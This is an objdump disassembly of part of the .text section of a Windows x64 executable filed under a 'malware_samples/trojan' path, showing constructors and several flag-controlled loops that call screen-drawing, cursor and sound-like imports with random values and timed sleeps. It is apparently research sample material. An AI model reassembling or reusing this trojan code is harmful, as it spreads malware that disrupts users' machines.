
malware_samples/trojan/99190648e39c83fe056aefb495c14be8dee0b46d74a8a862fa5ad7ef13b43a55.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 8d 0d 89 6a 00 00 	lea    0x6a89(%rip),%rcx        # 0x140007a90
   140001007:	e9 58 5d 00 00       	jmp    0x140006d64
   14000100c:	cc                   	int3
   14000100d:	cc                   	int3
   14000100e:	cc                   	int3
   14000100f:	cc                   	int3
   140001010:	48 8d 05 71 c9 00 00 	lea    0xc971(%rip),%rax        # 0x14000d988
   140001017:	c3                   	ret
   140001018:	cc                   	int3
   140001019:	cc                   	int3
   14000101a:	cc                   	int3
   14000101b:	cc                   	int3
   14000101c:	cc                   	int3
   14000101d:	cc                   	int3
   14000101e:	cc                   	int3
   14000101f:	cc                   	int3
   140001020:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001025:	57                   	push   %rdi
   140001026:	48 83 ec 20          	sub    $0x20,%rsp
   14000102a:	48 8b d9             	mov    %rcx,%rbx
   14000102d:	ff 15 5d 71 00 00    	call   *0x715d(%rip)        # 0x140008190
   140001033:	48 8b f8             	mov    %rax,%rdi
   140001036:	ff 15 b4 71 00 00    	call   *0x71b4(%rip)        # 0x1400081f0
   14000103c:	4c 8b c8             	mov    %rax,%r9
   14000103f:	48 81 ff 80 96 98 00 	cmp    $0x989680,%rdi
   140001046:	75 15                	jne    0x14000105d
   140001048:	49 6b c1 64          	imul   $0x64,%r9,%rax
   14000104c:	48 89 03             	mov    %rax,(%rbx)
   14000104f:	48 8b c3             	mov    %rbx,%rax
   140001052:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001057:	48 83 c4 20          	add    $0x20,%rsp
   14000105b:	5f                   	pop    %rdi
   14000105c:	c3                   	ret
   14000105d:	48 81 ff 00 36 6e 01 	cmp    $0x16e3600,%rdi
   140001064:	75 65                	jne    0x1400010cb
   140001066:	49 ba f3 8c 90 94 07 	movabs $0xb2f4fc0794908cf3,%r10
   14000106d:	fc f4 b2 
   140001070:	49 8b c2             	mov    %r10,%rax
   140001073:	49 f7 e9             	imul   %r9
   140001076:	49 8b c2             	mov    %r10,%rax
   140001079:	4d 8d 04 11          	lea    (%r9,%rdx,1),%r8
   14000107d:	49 c1 f8 18          	sar    $0x18,%r8
   140001081:	49 8b c8             	mov    %r8,%rcx
   140001084:	48 c1 e9 3f          	shr    $0x3f,%rcx
   140001088:	4c 03 c1             	add    %rcx,%r8
   14000108b:	49 69 c8 00 36 6e 01 	imul   $0x16e3600,%r8,%rcx
   140001092:	4c 2b c9             	sub    %rcx,%r9
   140001095:	49 69 c9 00 ca 9a 3b 	imul   $0x3b9aca00,%r9,%rcx
   14000109c:	48 f7 e9             	imul   %rcx
   14000109f:	48 03 d1             	add    %rcx,%rdx
   1400010a2:	48 c1 fa 18          	sar    $0x18,%rdx
   1400010a6:	48 8b c2             	mov    %rdx,%rax
   1400010a9:	48 c1 e8 3f          	shr    $0x3f,%rax
   1400010ad:	48 03 d0             	add    %rax,%rdx
   1400010b0:	49 69 c0 00 ca 9a 3b 	imul   $0x3b9aca00,%r8,%rax
   1400010b7:	48 03 d0             	add    %rax,%rdx
   1400010ba:	48 8b c3             	mov    %rbx,%rax
   1400010bd:	48 89 13             	mov    %rdx,(%rbx)
   1400010c0:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400010c5:	48 83 c4 20          	add    $0x20,%rsp
   1400010c9:	5f                   	pop    %rdi
   1400010ca:	c3                   	ret
   1400010cb:	48 99                	cqto
   1400010cd:	48 f7 ff             	idiv   %rdi
   1400010d0:	48 8b c8             	mov    %rax,%rcx
   1400010d3:	48 69 c2 00 ca 9a 3b 	imul   $0x3b9aca00,%rdx,%rax
   1400010da:	48 69 c9 00 ca 9a 3b 	imul   $0x3b9aca00,%rcx,%rcx
   1400010e1:	48 99                	cqto
   1400010e3:	48 f7 ff             	idiv   %rdi
   1400010e6:	48 03 c1             	add    %rcx,%rax
   1400010e9:	48 89 03             	mov    %rax,(%rbx)
   1400010ec:	48 8b c3             	mov    %rbx,%rax
   1400010ef:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400010f4:	48 83 c4 20          	add    $0x20,%rsp
   1400010f8:	5f                   	pop    %rdi
   1400010f9:	c3                   	ret
   1400010fa:	cc                   	int3
   1400010fb:	cc                   	int3
   1400010fc:	cc                   	int3
   1400010fd:	cc                   	int3
   1400010fe:	cc                   	int3
   1400010ff:	cc                   	int3
   140001100:	40 53                	rex push %rbx
   140001102:	48 83 ec 20          	sub    $0x20,%rsp
   140001106:	48 8b d9             	mov    %rcx,%rbx
   140001109:	48 8b c2             	mov    %rdx,%rax
   14000110c:	48 8d 0d 05 76 00 00 	lea    0x7605(%rip),%rcx        # 0x140008718
   140001113:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001116:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000111a:	48 89 0b             	mov    %rcx,(%rbx)
   14000111d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001121:	0f 11 02             	movups %xmm0,(%rdx)
   140001124:	ff 15 9e 72 00 00    	call   *0x729e(%rip)        # 0x1400083c8
   14000112a:	48 8b c3             	mov    %rbx,%rax
   14000112d:	48 83 c4 20          	add    $0x20,%rsp
   140001131:	5b                   	pop    %rbx
   140001132:	c3                   	ret
   140001133:	cc                   	int3
   140001134:	cc                   	int3
   140001135:	cc                   	int3
   140001136:	cc                   	int3
   140001137:	cc                   	int3
   140001138:	cc                   	int3
   140001139:	cc                   	int3
   14000113a:	cc                   	int3
   14000113b:	cc                   	int3
   14000113c:	cc                   	int3
   14000113d:	cc                   	int3
   14000113e:	cc                   	int3
   14000113f:	cc                   	int3
   140001140:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   140001144:	48 8d 05 1d 76 00 00 	lea    0x761d(%rip),%rax        # 0x140008768
   14000114b:	48 85 d2             	test   %rdx,%rdx
   14000114e:	48 0f 45 c2          	cmovne %rdx,%rax
   140001152:	c3                   	ret
   140001153:	cc                   	int3
   140001154:	cc                   	int3
   140001155:	cc                   	int3
   140001156:	cc                   	int3
   140001157:	cc                   	int3
   140001158:	cc                   	int3
   140001159:	cc                   	int3
   14000115a:	cc                   	int3
   14000115b:	cc                   	int3
   14000115c:	cc                   	int3
   14000115d:	cc                   	int3
   14000115e:	cc                   	int3
   14000115f:	cc                   	int3
   140001160:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001165:	57                   	push   %rdi
   140001166:	48 83 ec 20          	sub    $0x20,%rsp
   14000116a:	48 8d 05 a7 75 00 00 	lea    0x75a7(%rip),%rax        # 0x140008718
   140001171:	48 8b f9             	mov    %rcx,%rdi
   140001174:	48 89 01             	mov    %rax,(%rcx)
   140001177:	8b da                	mov    %edx,%ebx
   140001179:	48 83 c1 08          	add    $0x8,%rcx
   14000117d:	ff 15 4d 72 00 00    	call   *0x724d(%rip)        # 0x1400083d0
   140001183:	f6 c3 01             	test   $0x1,%bl
   140001186:	74 0d                	je     0x140001195
   140001188:	ba 18 00 00 00       	mov    $0x18,%edx
   14000118d:	48 8b cf             	mov    %rdi,%rcx
   140001190:	e8 cb 56 00 00       	call   0x140006860
   140001195:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000119a:	48 8b c7             	mov    %rdi,%rax
   14000119d:	48 83 c4 20          	add    $0x20,%rsp
   1400011a1:	5f                   	pop    %rdi
   1400011a2:	c3                   	ret
   1400011a3:	cc                   	int3
   1400011a4:	cc                   	int3
   1400011a5:	cc                   	int3
   1400011a6:	cc                   	int3
   1400011a7:	cc                   	int3
   1400011a8:	cc                   	int3
   1400011a9:	cc                   	int3
   1400011aa:	cc                   	int3
   1400011ab:	cc                   	int3
   1400011ac:	cc                   	int3
   1400011ad:	cc                   	int3
   1400011ae:	cc                   	int3
   1400011af:	cc                   	int3
   1400011b0:	48 8d 05 61 75 00 00 	lea    0x7561(%rip),%rax        # 0x140008718
   1400011b7:	48 89 01             	mov    %rax,(%rcx)
   1400011ba:	48 83 c1 08          	add    $0x8,%rcx
   1400011be:	48 ff 25 0b 72 00 00 	rex.W jmp *0x720b(%rip)        # 0x1400083d0
   1400011c5:	cc                   	int3
   1400011c6:	cc                   	int3
   1400011c7:	cc                   	int3
   1400011c8:	cc                   	int3
   1400011c9:	cc                   	int3
   1400011ca:	cc                   	int3
   1400011cb:	cc                   	int3
   1400011cc:	cc                   	int3
   1400011cd:	cc                   	int3
   1400011ce:	cc                   	int3
   1400011cf:	cc                   	int3
   1400011d0:	48 8d 05 a9 75 00 00 	lea    0x75a9(%rip),%rax        # 0x140008780
   1400011d7:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   1400011de:	00 
   1400011df:	48 89 41 08          	mov    %rax,0x8(%rcx)
   1400011e3:	48 8d 05 6e 75 00 00 	lea    0x756e(%rip),%rax        # 0x140008758
   1400011ea:	48 89 01             	mov    %rax,(%rcx)
   1400011ed:	48 8b c1             	mov    %rcx,%rax
   1400011f0:	c3                   	ret
   1400011f1:	cc                   	int3
   1400011f2:	cc                   	int3
   1400011f3:	cc                   	int3
   1400011f4:	cc                   	int3
   1400011f5:	cc                   	int3
   1400011f6:	cc                   	int3
   1400011f7:	cc                   	int3
   1400011f8:	cc                   	int3
   1400011f9:	cc                   	int3
   1400011fa:	cc                   	int3
   1400011fb:	cc                   	int3
   1400011fc:	cc                   	int3
   1400011fd:	cc                   	int3
   1400011fe:	cc                   	int3
   1400011ff:	cc                   	int3
   140001200:	48 8d 05 91 75 00 00 	lea    0x7591(%rip),%rax        # 0x140008798
   140001207:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   14000120e:	00 
   14000120f:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140001213:	48 8d 05 0e 7c 00 00 	lea    0x7c0e(%rip),%rax        # 0x140008e28
   14000121a:	48 89 01             	mov    %rax,(%rcx)
   14000121d:	48 8b c1             	mov    %rcx,%rax
   140001220:	c3                   	ret
   140001221:	cc                   	int3
   140001222:	cc                   	int3
   140001223:	cc                   	int3
   140001224:	cc                   	int3
   140001225:	cc                   	int3
   140001226:	cc                   	int3
   140001227:	cc                   	int3
   140001228:	cc                   	int3
   140001229:	cc                   	int3
   14000122a:	cc                   	int3
   14000122b:	cc                   	int3
   14000122c:	cc                   	int3
   14000122d:	cc                   	int3
   14000122e:	cc                   	int3
   14000122f:	cc                   	int3
   140001230:	48 83 ec 48          	sub    $0x48,%rsp
   140001234:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001239:	e8 c2 ff ff ff       	call   0x140001200
   14000123e:	48 8d 15 33 93 00 00 	lea    0x9333(%rip),%rdx        # 0x14000a578
   140001245:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000124a:	e8 7d 64 00 00       	call   0x1400076cc
   14000124f:	cc                   	int3
   140001250:	40 53                	rex push %rbx
   140001252:	48 83 ec 20          	sub    $0x20,%rsp
   140001256:	48 8b d9             	mov    %rcx,%rbx
   140001259:	48 8b c2             	mov    %rdx,%rax
   14000125c:	48 8d 0d b5 74 00 00 	lea    0x74b5(%rip),%rcx        # 0x140008718
   140001263:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001266:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000126a:	48 89 0b             	mov    %rcx,(%rbx)
   14000126d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001271:	0f 11 02             	movups %xmm0,(%rdx)
   140001274:	ff 15 4e 71 00 00    	call   *0x714e(%rip)        # 0x1400083c8
   14000127a:	48 8d 05 a7 7b 00 00 	lea    0x7ba7(%rip),%rax        # 0x140008e28
   140001281:	48 89 03             	mov    %rax,(%rbx)
   140001284:	48 8b c3             	mov    %rbx,%rax
   140001287:	48 83 c4 20          	add    $0x20,%rsp
   14000128b:	5b                   	pop    %rbx
   14000128c:	c3                   	ret
   14000128d:	cc                   	int3
   14000128e:	cc                   	int3
   14000128f:	cc                   	int3
   140001290:	48 83 ec 48          	sub    $0x48,%rsp
   140001294:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001299:	e8 32 ff ff ff       	call   0x1400011d0
   14000129e:	48 8d 15 93 93 00 00 	lea    0x9393(%rip),%rdx        # 0x14000a638
   1400012a5:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400012aa:	e8 1d 64 00 00       	call   0x1400076cc
   1400012af:	cc                   	int3
   1400012b0:	40 53                	rex push %rbx
   1400012b2:	48 83 ec 20          	sub    $0x20,%rsp
   1400012b6:	48 8b d9             	mov    %rcx,%rbx
   1400012b9:	48 8b c2             	mov    %rdx,%rax
   1400012bc:	48 8d 0d 55 74 00 00 	lea    0x7455(%rip),%rcx        # 0x140008718
   1400012c3:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400012c6:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   1400012ca:	48 89 0b             	mov    %rcx,(%rbx)
   1400012cd:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1400012d1:	0f 11 02             	movups %xmm0,(%rdx)
   1400012d4:	ff 15 ee 70 00 00    	call   *0x70ee(%rip)        # 0x1400083c8
   1400012da:	48 8d 05 77 74 00 00 	lea    0x7477(%rip),%rax        # 0x140008758
   1400012e1:	48 89 03             	mov    %rax,(%rbx)
   1400012e4:	48 8b c3             	mov    %rbx,%rax
   1400012e7:	48 83 c4 20          	add    $0x20,%rsp
   1400012eb:	5b                   	pop    %rbx
   1400012ec:	c3                   	ret
   1400012ed:	cc                   	int3
   1400012ee:	cc                   	int3
   1400012ef:	cc                   	int3
   1400012f0:	40 53                	rex push %rbx
   1400012f2:	48 83 ec 20          	sub    $0x20,%rsp
   1400012f6:	48 8b d9             	mov    %rcx,%rbx
   1400012f9:	48 8b c2             	mov    %rdx,%rax
   1400012fc:	48 8d 0d 15 74 00 00 	lea    0x7415(%rip),%rcx        # 0x140008718
   140001303:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001306:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000130a:	48 89 0b             	mov    %rcx,(%rbx)
   14000130d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001311:	0f 11 02             	movups %xmm0,(%rdx)
   140001314:	ff 15 ae 70 00 00    	call   *0x70ae(%rip)        # 0x1400083c8
   14000131a:	48 8d 05 0f 74 00 00 	lea    0x740f(%rip),%rax        # 0x140008730
   140001321:	48 89 03             	mov    %rax,(%rbx)
   140001324:	48 8b c3             	mov    %rbx,%rax
   140001327:	48 83 c4 20          	add    $0x20,%rsp
   14000132b:	5b                   	pop    %rbx
   14000132c:	c3                   	ret
   14000132d:	cc                   	int3
   14000132e:	cc                   	int3
   14000132f:	cc                   	int3
   140001330:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001335:	57                   	push   %rdi
   140001336:	48 83 ec 20          	sub    $0x20,%rsp
   14000133a:	48 8b 19             	mov    (%rcx),%rbx
   14000133d:	48 8b f9             	mov    %rcx,%rdi
   140001340:	48 85 db             	test   %rbx,%rbx
   140001343:	74 4e                	je     0x140001393
   140001345:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000134a:	f0 0f c1 43 10       	lock xadd %eax,0x10(%rbx)
   14000134f:	83 f8 01             	cmp    $0x1,%eax
   140001352:	75 38                	jne    0x14000138c
   140001354:	48 8b 0b             	mov    (%rbx),%rcx
   140001357:	48 85 c9             	test   %rcx,%rcx
   14000135a:	74 0d                	je     0x140001369
   14000135c:	ff 15 0e 6f 00 00    	call   *0x6f0e(%rip)        # 0x140008270
   140001362:	48 c7 03 00 00 00 00 	movq   $0x0,(%rbx)
   140001369:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   14000136d:	48 85 c9             	test   %rcx,%rcx
   140001370:	74 0d                	je     0x14000137f
   140001372:	e8 e9 54 00 00       	call   0x140006860
   140001377:	48 c7 43 08 00 00 00 	movq   $0x0,0x8(%rbx)
   14000137e:	00 
   14000137f:	ba 18 00 00 00       	mov    $0x18,%edx
   140001384:	48 8b cb             	mov    %rbx,%rcx
   140001387:	e8 d4 54 00 00       	call   0x140006860
   14000138c:	48 c7 07 00 00 00 00 	movq   $0x0,(%rdi)
   140001393:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140001398:	48 83 c4 20          	add    $0x20,%rsp
   14000139c:	5f                   	pop    %rdi
   14000139d:	c3                   	ret
   14000139e:	cc                   	int3
   14000139f:	cc                   	int3
   1400013a0:	48 ff 25 b9 6e 00 00 	rex.W jmp *0x6eb9(%rip)        # 0x140008260
   1400013a7:	cc                   	int3
   1400013a8:	cc                   	int3
   1400013a9:	cc                   	int3
   1400013aa:	cc                   	int3
   1400013ab:	cc                   	int3
   1400013ac:	cc                   	int3
   1400013ad:	cc                   	int3
   1400013ae:	cc                   	int3
   1400013af:	cc                   	int3
   1400013b0:	48 83 ec 28          	sub    $0x28,%rsp
   1400013b4:	48 8d 0d ed 73 00 00 	lea    0x73ed(%rip),%rcx        # 0x1400087a8
   1400013bb:	ff 15 17 6e 00 00    	call   *0x6e17(%rip)        # 0x1400081d8
   1400013c1:	cc                   	int3
   1400013c2:	cc                   	int3
   1400013c3:	cc                   	int3
   1400013c4:	cc                   	int3
   1400013c5:	cc                   	int3
   1400013c6:	cc                   	int3
   1400013c7:	cc                   	int3
   1400013c8:	cc                   	int3
   1400013c9:	cc                   	int3
   1400013ca:	cc                   	int3
   1400013cb:	cc                   	int3
   1400013cc:	cc                   	int3
   1400013cd:	cc                   	int3
   1400013ce:	cc                   	int3
   1400013cf:	cc                   	int3
   1400013d0:	48 83 ec 28          	sub    $0x28,%rsp
   1400013d4:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   1400013d8:	48 85 c9             	test   %rcx,%rcx
   1400013db:	74 20                	je     0x1400013fd
   1400013dd:	48 8b 01             	mov    (%rcx),%rax
   1400013e0:	ff 50 10             	call   *0x10(%rax)
   1400013e3:	48 85 c0             	test   %rax,%rax
   1400013e6:	74 15                	je     0x1400013fd
   1400013e8:	48 8b 08             	mov    (%rax),%rcx
   1400013eb:	ba 01 00 00 00       	mov    $0x1,%edx
   1400013f0:	4c 8b 01             	mov    (%rcx),%r8
   1400013f3:	48 8b c8             	mov    %rax,%rcx
   1400013f6:	48 83 c4 28          	add    $0x28,%rsp
   1400013fa:	49 ff e0             	rex.WB jmp *%r8
   1400013fd:	48 83 c4 28          	add    $0x28,%rsp
   140001401:	c3                   	ret
   140001402:	cc                   	int3
   140001403:	cc                   	int3
   140001404:	cc                   	int3
   140001405:	cc                   	int3
   140001406:	cc                   	int3
   140001407:	cc                   	int3
   140001408:	cc                   	int3
   140001409:	cc                   	int3
   14000140a:	cc                   	int3
   14000140b:	cc                   	int3
   14000140c:	cc                   	int3
   14000140d:	cc                   	int3
   14000140e:	cc                   	int3
   14000140f:	cc                   	int3
   140001410:	40 57                	rex push %rdi
   140001412:	48 83 ec 60          	sub    $0x60,%rsp
   140001416:	33 c9                	xor    %ecx,%ecx
   140001418:	ff 15 ea 6e 00 00    	call   *0x6eea(%rip)        # 0x140008308
   14000141e:	80 3d 8f bc 00 00 00 	cmpb   $0x0,0xbc8f(%rip)        # 0x14000d0b4
   140001425:	48 8b f8             	mov    %rax,%rdi
   140001428:	0f 84 c4 00 00 00    	je     0x1400014f2
   14000142e:	48 89 9c 24 80 00 00 	mov    %rbx,0x80(%rsp)
   140001435:	00 
   140001436:	48 89 ac 24 88 00 00 	mov    %rbp,0x88(%rsp)
   14000143d:	00 
   14000143e:	33 ed                	xor    %ebp,%ebp
   140001440:	48 89 74 24 58       	mov    %rsi,0x58(%rsp)
   140001445:	48 be ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rsi
   14000144c:	ff ff 7f 
   14000144f:	4c 89 74 24 50       	mov    %r14,0x50(%rsp)
   140001454:	49 be ff 35 65 c4 ff 	movabs $0x7fffffffc46535ff,%r14
   14000145b:	ff ff 7f 
   14000145e:	66 90                	xchg   %ax,%ax
   140001460:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001465:	ff 15 bd 6e 00 00    	call   *0x6ebd(%rip)        # 0x140008328
   14000146b:	33 c9                	xor    %ecx,%ecx
   14000146d:	8b d8                	mov    %eax,%ebx
   14000146f:	ff 15 b3 6e 00 00    	call   *0x6eb3(%rip)        # 0x140008328
   140001475:	c7 44 24 40 08 00 33 	movl   $0x330008,0x40(%rsp)
   14000147c:	00 
   14000147d:	45 33 c0             	xor    %r8d,%r8d
   140001480:	89 6c 24 38          	mov    %ebp,0x38(%rsp)
   140001484:	44 8b c8             	mov    %eax,%r9d
   140001487:	89 6c 24 30          	mov    %ebp,0x30(%rsp)
   14000148b:	33 d2                	xor    %edx,%edx
   14000148d:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   140001492:	48 8b cf             	mov    %rdi,%rcx
   140001495:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   140001499:	ff 15 89 6b 00 00    	call   *0x6b89(%rip)        # 0x140008028
   14000149f:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
   1400014a4:	e8 77 fb ff ff       	call   0x140001020
   1400014a9:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   1400014ae:	49 3b c6             	cmp    %r14,%rax
   1400014b1:	7d 0d                	jge    0x1400014c0
   1400014b3:	48 05 00 ca 9a 3b    	add    $0x3b9aca00,%rax
   1400014b9:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   1400014be:	eb 05                	jmp    0x1400014c5
   1400014c0:	48 89 74 24 70       	mov    %rsi,0x70(%rsp)
   1400014c5:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400014ca:	e8 31 48 00 00       	call   0x140005d00
   1400014cf:	40 38 2d de bb 00 00 	cmp    %bpl,0xbbde(%rip)        # 0x14000d0b4
   1400014d6:	75 88                	jne    0x140001460
   1400014d8:	4c 8b 74 24 50       	mov    0x50(%rsp),%r14
   1400014dd:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   1400014e2:	48 8b ac 24 88 00 00 	mov    0x88(%rsp),%rbp
   1400014e9:	00 
   1400014ea:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   1400014f1:	00 
   1400014f2:	48 8b d7             	mov    %rdi,%rdx
   1400014f5:	33 c9                	xor    %ecx,%ecx
   1400014f7:	48 83 c4 60          	add    $0x60,%rsp
   1400014fb:	5f                   	pop    %rdi
   1400014fc:	48 ff 25 f5 6d 00 00 	rex.W jmp *0x6df5(%rip)        # 0x1400082f8
   140001503:	cc                   	int3
   140001504:	cc                   	int3
   140001505:	cc                   	int3
   140001506:	cc                   	int3
   140001507:	cc                   	int3
   140001508:	cc                   	int3
   140001509:	cc                   	int3
   14000150a:	cc                   	int3
   14000150b:	cc                   	int3
   14000150c:	cc                   	int3
   14000150d:	cc                   	int3
   14000150e:	cc                   	int3
   14000150f:	cc                   	int3
   140001510:	40 56                	rex push %rsi
   140001512:	57                   	push   %rdi
   140001513:	48 83 ec 28          	sub    $0x28,%rsp
   140001517:	33 c9                	xor    %ecx,%ecx
   140001519:	ff 15 09 6e 00 00    	call   *0x6e09(%rip)        # 0x140008328
   14000151f:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001524:	8b f8                	mov    %eax,%edi
   140001526:	ff 15 fc 6d 00 00    	call   *0x6dfc(%rip)        # 0x140008328
   14000152c:	80 3d 81 bb 00 00 00 	cmpb   $0x0,0xbb81(%rip)        # 0x14000d0b4
   140001533:	8b f0                	mov    %eax,%esi
   140001535:	0f 84 89 00 00 00    	je     0x1400015c4
   14000153b:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140001540:	48 89 6c 24 58       	mov    %rbp,0x58(%rsp)
   140001545:	48 bd ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbp
   14000154c:	ff ff 7f 
   14000154f:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140001554:	49 be ff 5c 1e ee ff 	movabs $0x7fffffffee1e5cff,%r14
   14000155b:	ff ff 7f 
   14000155e:	66 90                	xchg   %ax,%ax
   140001560:	ff 15 5a 70 00 00    	call   *0x705a(%rip)        # 0x1400085c0
   140001566:	99                   	cltd
   140001567:	f7 ff                	idiv   %edi
   140001569:	8b da                	mov    %edx,%ebx
   14000156b:	ff 15 4f 70 00 00    	call   *0x704f(%rip)        # 0x1400085c0
   140001571:	99                   	cltd
   140001572:	8b cb                	mov    %ebx,%ecx
   140001574:	f7 fe                	idiv   %esi
   140001576:	ff 15 44 6d 00 00    	call   *0x6d44(%rip)        # 0x1400082c0
   14000157c:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140001581:	e8 9a fa ff ff       	call   0x140001020
   140001586:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   14000158b:	49 3b c6             	cmp    %r14,%rax
   14000158e:	7d 0d                	jge    0x14000159d
   140001590:	48 05 00 a3 e1 11    	add    $0x11e1a300,%rax
   140001596:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000159b:	eb 05                	jmp    0x1400015a2
   14000159d:	48 89 6c 24 40       	mov    %rbp,0x40(%rsp)
   1400015a2:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400015a7:	e8 54 47 00 00       	call   0x140005d00
   1400015ac:	80 3d 01 bb 00 00 00 	cmpb   $0x0,0xbb01(%rip)        # 0x14000d0b4
   1400015b3:	75 ab                	jne    0x140001560
   1400015b5:	4c 8b 74 24 20       	mov    0x20(%rsp),%r14
   1400015ba:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   1400015bf:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1400015c4:	48 83 c4 28          	add    $0x28,%rsp
   1400015c8:	5f                   	pop    %rdi
   1400015c9:	5e                   	pop    %rsi
   1400015ca:	c3                   	ret
   1400015cb:	cc                   	int3
   1400015cc:	cc                   	int3
   1400015cd:	cc                   	int3
   1400015ce:	cc                   	int3
   1400015cf:	cc                   	int3
   1400015d0:	48 83 ec 28          	sub    $0x28,%rsp
   1400015d4:	80 3d d9 ba 00 00 00 	cmpb   $0x0,0xbad9(%rip)        # 0x14000d0b4
   1400015db:	0f 84 94 00 00 00    	je     0x140001675
   1400015e1:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   1400015e6:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   1400015ed:	ff ff 7f 
   1400015f0:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400015f5:	48 bf ff d8 46 d6 ff 	movabs $0x7fffffffd646d8ff,%rdi
   1400015fc:	ff ff 7f 
   1400015ff:	90                   	nop
   140001600:	ff 15 ba 6f 00 00    	call   *0x6fba(%rip)        # 0x1400085c0
   140001606:	8b c8                	mov    %eax,%ecx
   140001608:	b8 f1 19 76 05       	mov    $0x57619f1,%eax
   14000160d:	f7 e9                	imul   %ecx
   14000160f:	c1 fa 05             	sar    $0x5,%edx
   140001612:	8b c2                	mov    %edx,%eax
   140001614:	c1 e8 1f             	shr    $0x1f,%eax
   140001617:	03 d0                	add    %eax,%edx
   140001619:	69 c2 dc 05 00 00    	imul   $0x5dc,%edx,%eax
   14000161f:	ba c8 00 00 00       	mov    $0xc8,%edx
   140001624:	2b c8                	sub    %eax,%ecx
   140001626:	81 c1 f4 01 00 00    	add    $0x1f4,%ecx
   14000162c:	ff 15 be 6a 00 00    	call   *0x6abe(%rip)        # 0x1400080f0
   140001632:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   140001637:	e8 e4 f9 ff ff       	call   0x140001020
   14000163c:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140001641:	48 3b c7             	cmp    %rdi,%rax
   140001644:	7d 0d                	jge    0x140001653
   140001646:	48 05 00 27 b9 29    	add    $0x29b92700,%rax
   14000164c:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140001651:	eb 05                	jmp    0x140001658
   140001653:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140001658:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000165d:	e8 9e 46 00 00       	call   0x140005d00
   140001662:	80 3d 4b ba 00 00 00 	cmpb   $0x0,0xba4b(%rip)        # 0x14000d0b4
   140001669:	75 95                	jne    0x140001600
   14000166b:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   140001670:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140001675:	48 83 c4 28          	add    $0x28,%rsp
   140001679:	c3                   	ret
   14000167a:	cc                   	int3
   14000167b:	cc                   	int3
   14000167c:	cc                   	int3
   14000167d:	cc                   	int3
   14000167e:	cc                   	int3
   14000167f:	cc                   	int3
   140001680:	48 83 ec 28          	sub    $0x28,%rsp
   140001684:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001689:	ff 15 39 6c 00 00    	call   *0x6c39(%rip)        # 0x1400082c8
   14000168f:	80 3d 1e ba 00 00 00 	cmpb   $0x0,0xba1e(%rip)        # 0x14000d0b4
   140001696:	74 61                	je     0x1400016f9
   140001698:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   14000169d:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   1400016a4:	ff ff 7f 
   1400016a7:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400016ac:	48 bf ff 35 65 c4 ff 	movabs $0x7fffffffc46535ff,%rdi
   1400016b3:	ff ff 7f 
   1400016b6:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   1400016bb:	e8 60 f9 ff ff       	call   0x140001020
